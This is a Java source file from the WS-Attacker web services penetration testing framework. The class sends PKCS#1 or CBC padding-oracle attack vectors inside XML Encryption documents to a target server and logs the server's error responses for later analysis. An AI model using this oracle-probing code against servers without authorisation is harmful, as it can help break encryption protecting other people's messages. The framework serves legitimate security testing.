/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */

package wsattacker.plugin.xmlencryptionattack.serverbehaviour;

import java.io.IOException;
import java.util.Observable;
import javax.xml.bind.JAXBException;
import javax.xml.xpath.XPathExpressionException;
import org.apache.log4j.Logger;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.SAXException;
import wsattacker.library.signatureWrapping.util.exception.InvalidPayloadException;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.xmlencryptionattack.attackengine.AttackConfig;
import wsattacker.library.xmlencryptionattack.attackengine.CryptoAttackException;
import wsattacker.library.xmlencryptionattack.attackengine.attacker.cbc.CBCVectorGenerator;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.OracleRequest;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.pkcs1.strategy.PKCS1StrategyFactory.PKCS1Strategy;
import wsattacker.library.xmlencryptionattack.attackengine.attacker.pkcs1.PKCS1VectorGenerator;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness.EncryptedKeyRefWeakness;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionmanager.DetectFilterEnum;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionstreams.DetectionReport;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.AvoidedDocErrorInfo;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.TimestampInfo;
import wsattacker.library.xmlencryptionattack.encryptedelements.AbstractEncryptionElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.ElementAttackProperties;
import wsattacker.library.xmlencryptionattack.encryptedelements.data.EncryptedDataElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.EncryptedKeyElement;
import wsattacker.library.xmlencryptionattack.timestampelement.TimestampBase;
import wsattacker.library.xmlencryptionattack.util.CryptoConstants;
import wsattacker.library.xmlencryptionattack.util.HelperFunctions;
import wsattacker.library.xmlencryptionattack.util.ServerSendCommandIF;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.WrappingAttackMode.NO_WRAP;
import wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.XMLEncryptionAttackMode;
import wsattacker.library.xmlutilities.dom.DomUtilities;
import wsattacker.main.composition.plugin.option.AbstractOption;
import wsattacker.main.plugin.result.Result;
import wsattacker.main.plugin.result.ResultEntry;
import wsattacker.main.plugin.result.ResultLevel;
import wsattacker.plugin.xmlencryptionattack.XMLEncryptionAttack;
import wsattacker.plugin.xmlencryptionattack.option.OptionServerErrorBehaviour;

/**
 * @author Dennis
 */
// TODO: integrate parts of this class in lib
public class ServerErrMsgSendFunc
    extends Observable
    implements Runnable
{
    private static final Logger LOG = Logger.getLogger(ServerErrMsgSendFunc.class);

    private final AttackConfig m_AttackCfg;

    private final DetectionReport m_DetectionReport;

    private final AbstractOption m_Option;

    private final ServerSendCommandIF m_SerSendCmnd;

    private boolean m_IsStopped = false;

    private boolean m_IsPKCS1WithEncData = false;

    public ServerErrMsgSendFunc( AttackConfig attackcfg, DetectionReport detectReport, AbstractOption option,
                                 ServerSendCommandIF serCmd )
    {
        // wrapping muss einbezogen werden!!!

        this.m_SerSendCmnd = serCmd;
        this.m_DetectionReport = detectReport;
        this.m_AttackCfg = attackcfg;
        this.m_Option = option;
    }

    @Override
    public void run()
    {
        OracleRequest[] generateVectors = null;
        try
        {
            ( (OptionServerErrorBehaviour) m_Option ).setGUIButtonState( false );
            ( (XMLEncryptionAttack) m_Option.getCollection().getOwnerPlugin() ).getAvoidedAttackRequest( m_DetectionReport );
        }
        catch ( InvalidWeaknessException | InvalidPayloadException | SAXException | XPathExpressionException ex)
        {
            LOG.error(ex);
        }
        AvoidedDocErrorInfo errorInfo =
            (AvoidedDocErrorInfo) m_DetectionReport.getDetectionInfo( DetectFilterEnum.AVOIDDOCFILTER );
        if ( null == errorInfo )
        {
            Result.getGlobalResult().add( new ResultEntry( ResultLevel.Important, ServerErrMsgSendFunc.class.getName(),
                                                           "Could not generate an avoided Document: Attack not possible" ) );
            ( (OptionServerErrorBehaviour) m_Option ).setGUIButtonState( true );
            return;
        }
        CryptoConstants.Algorithm algo = errorInfo.getAlgoOfSymmtricBlockCipher();
        // better solution= => filter object?
        if ( XMLEncryptionAttackMode.PKCS1_ATTACK == m_AttackCfg.getXMLEncryptionAttack() )
        {
            try
            {
                generateVectors =
                    PKCS1VectorGenerator.generatePkcs1Vectors( m_AttackCfg.getPKCS1AttackCfg().getServerRSAPubKey(),
                                                               algo, m_IsPKCS1WithEncData );
            }
            catch ( CryptoAttackException ex )
            {
		    LOG.error(ex);
            }
        }
        else if ( XMLEncryptionAttackMode.CBC_ATTACK == m_AttackCfg.getXMLEncryptionAttack() )
            generateVectors = CBCVectorGenerator.generateVectors( algo.BLOCK_SIZE );
        else
            throw new IllegalArgumentException( "no valid xml encryption attack" );

        try
        {
            preparePayloadForServer( generateVectors, errorInfo );
        }
        catch ( InterruptedException | InvalidPayloadException | SAXException | XPathExpressionException ex )
        {
            LOG.error(ex);
        }
    }

    private void preparePayloadForServer( OracleRequest[] generateVectors, AvoidedDocErrorInfo errorInfo )
        throws InterruptedException, InvalidPayloadException, SAXException, XPathExpressionException
    {
        AbstractEncryptionElement originalEncEl = null;
        AbstractEncryptionElement dmyAttack = null;
        AbstractEncryptionElement dmyAttackEncDataKey = null;
        Element errEncDataKeyElement = null;
        Document errDocument = DomUtilities.createNewDomFromNode( errorInfo.getAvoidedDocument().getDocumentElement() );
        originalEncEl = errorInfo.getOriginalPayInput();
        ElementAttackProperties atttackPropsOriginal = originalEncEl.getAttackProperties();
        Element errPayElement =
            DomUtilities.findCorrespondingElement( errDocument, atttackPropsOriginal.getAttackPayloadElement() );

        // set Payload element
        if ( originalEncEl instanceof EncryptedKeyElement )
        {

            ElementAttackProperties dataAttackProps = null;
            EncryptedDataElement encDataRef =
                HelperFunctions.getEncDataOfEncryptedKey( (EncryptedKeyElement) originalEncEl );
            dataAttackProps = encDataRef.getAttackProperties();

            if ( null != dataAttackProps.getAttackPayloadElement() ) // wrapping attack result
                errEncDataKeyElement =
                    DomUtilities.findCorrespondingElement( errDocument, dataAttackProps.getAttackPayloadElement() );
            else
                // no wrapping before
                errEncDataKeyElement =
                    DomUtilities.findCorrespondingElement( errDocument, encDataRef.getEncryptedElement() );
            dmyAttack = new EncryptedKeyElement( errPayElement );
            dmyAttackEncDataKey = new EncryptedDataElement( errEncDataKeyElement );

            if ( PKCS1Strategy.NO_KEYREF == m_AttackCfg.getPKCS1AttackCfg().getPKCS1Strategy() )
            {
                EncryptedKeyRefWeakness.deleteOldEncKeyReference( errPayElement );
            }
        }
        else
            dmyAttack = new EncryptedDataElement( errPayElement );

        getErrorBehaviour( dmyAttack, dmyAttackEncDataKey, errDocument, generateVectors );
    }

    private void getErrorBehaviour( AbstractEncryptionElement dmyAttack, AbstractEncryptionElement dmyAttackEncDataKey,
                                    Document errDocument, OracleRequest[] generateVectors )
        throws SAXException, XPathExpressionException
    {
        String attackDocumentAsString = null;
        OracleResponse serverResp = null;
        TimestampBase timestamp = null;
        TimestampInfo timeInfo = (TimestampInfo) m_DetectionReport.getDetectionInfo( DetectFilterEnum.TIMESTAMPFILTER );

        if ( null != timeInfo )
            timestamp = timeInfo.getTimestamp();

        for ( int i = 0; generateVectors.length > i && !m_IsStopped; i++ )
        {
            setCipherPayload( i, dmyAttack, dmyAttackEncDataKey, generateVectors );

            if ( null != timestamp )
            {
                timestamp.updateTimeStamp( errDocument );
            }

            attackDocumentAsString = DomUtilities.domToString( errDocument );

            serverResp = new OracleResponse();
            serverResp.setResponse( m_SerSendCmnd.send( attackDocumentAsString ) );
            serverResp.setRequest( attackDocumentAsString );
            // user has to decide which responses are valid
            serverResp.setResult( OracleResponse.Result.INVALID );
            if ( null != serverResp.getResponse() )
            {
                if ( !attackDocumentAsString.equals( serverResp.getResponse() )
                    && !serverResp.getResponse().equals( "" ) )
                {
                    if ( m_IsPKCS1WithEncData )
                        ( (OptionServerErrorBehaviour) m_Option ).updateServerErrOption( serverResp,
                                                                                         dmyAttackEncDataKey );
                    else
                        ( (OptionServerErrorBehaviour) m_Option ).updateServerErrOption( serverResp, dmyAttack );
                    ( (OptionServerErrorBehaviour) m_Option ).updateProgressBar( (int) ( (float) i
                        / (float) ( generateVectors.length ) * 100 ) );
                }
            }
        }

        m_SerSendCmnd.cleanCmd();
        if ( !m_IsStopped && 1 >= m_DetectionReport.getErrorResponseTab().getData().size()
            && NO_WRAP != m_AttackCfg.getWrappingMode() )
        {
            Result.getGlobalResult().add( new ResultEntry( ResultLevel.Important, ServerErrMsgSendFunc.class.getName(),
                                                           "No valid Wrapping Position for this Attack" ) );
            try
            {
                ( (OptionServerErrorBehaviour) m_Option ).getServerBehaviour();
            }
            catch ( IOException | CryptoAttackException | JAXBException ex )
            {
                LOG.error(ex);
	    }
        }
        else
        {
            ( (OptionServerErrorBehaviour) m_Option ).setGUIButtonState( true );
        }
    }

    private void setCipherPayload( int index, AbstractEncryptionElement dmyAttack,
                                   AbstractEncryptionElement dmyAttackEncDataKey, OracleRequest[] generateVectors )
    {
        if ( XMLEncryptionAttackMode.PKCS1_ATTACK == m_AttackCfg.getXMLEncryptionAttack() )
        {
            if ( m_IsPKCS1WithEncData )
                dmyAttackEncDataKey.getCipherDataChild().setEncryptedData( generateVectors[index].getEncryptedDataBase64() );

            dmyAttack.getCipherDataChild().setEncryptedData( generateVectors[index].getEncryptedKeyBase64() );
        }
        else if ( XMLEncryptionAttackMode.CBC_ATTACK == m_AttackCfg.getXMLEncryptionAttack() )
        {
            dmyAttack.getCipherDataChild().setEncryptedData( generateVectors[index].getEncryptedDataBase64() );
        }
    }

    public void stop()
    {
        m_IsStopped = true;
        m_SerSendCmnd.cleanCmd();
    }

    public void setIsPKCS1WithEncData( boolean state )
    {
        m_IsPKCS1WithEncData = state;
    }
}
